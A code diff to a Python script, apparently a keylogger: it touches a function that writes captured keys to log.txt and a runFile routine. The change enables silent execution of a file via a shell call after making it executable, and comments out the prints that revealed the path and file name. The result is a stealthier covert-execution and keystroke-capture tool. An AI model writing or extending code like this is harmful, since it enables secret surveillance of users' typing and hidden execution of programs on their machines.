@@ -60,6 +60,8 @@ def write_file(keys):
 
     with open("log.txt", "a+") as f:
 
+        
+
         for key in keys:
 
             k = str(key).replace("'", "")
@@ -75,7 +77,6 @@ def write_file(keys):
             elif k.find("Key") == -1:
 
                 f.write(k)
-            
 
            
 
@@ -245,28 +246,14 @@ def runFile(filename):
 
     os.chdir(home)
 
-    print(myString)
+    #print(myString)
 
-    print("PATH %s" % home)
+    #print("PATH %s" % home)
 
     os.chmod('%s' % myString, 0o755)
 
     
 
-    #rc = call("%s" % myString, shell = True)
+    rc = call("%s" % myString, shell = True)
 
-        
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
+  
